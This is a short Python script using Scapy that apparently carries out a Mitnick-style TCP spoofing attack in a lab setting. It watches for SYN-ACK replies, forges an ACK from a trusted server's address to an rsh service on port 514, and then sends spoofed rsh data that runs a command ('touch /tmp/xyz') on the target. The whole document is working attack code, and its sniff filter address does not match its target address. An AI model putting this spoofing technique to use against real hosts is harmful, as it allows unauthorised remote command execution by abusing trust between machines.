#!usr/bin/python3
from scapy.all import *
import sys

X_terminal_IP = "10.0.2.8"
X_terminal_Port = 514

Trusted_Server_IP = "10.0.2.10"
Trusted_Server_Port = 1023

def spoof_pkt(pkt):
	sequence = 3371271375 + 1
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
		old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))

	if old_tcp.flags == "SA":
		print("Sending Spoofed ACK Packet ...")
		IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
		TCPLayer = TCP(sport=Trusted_Server_Port,dport=X_terminal_Port,flags="A",
		 seq=sequence, ack= old_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)

		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet ...")
		data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
		pkt = IPLayer/TCPLayer/data
		send(pkt,verbose=0)


def main():
	pkt = sniff(filter="tcp and src host 10.9.0.5", prn=spoof_pkt,iface="br-a6b037747ef9")

if __name__ == "__main__":
	main()
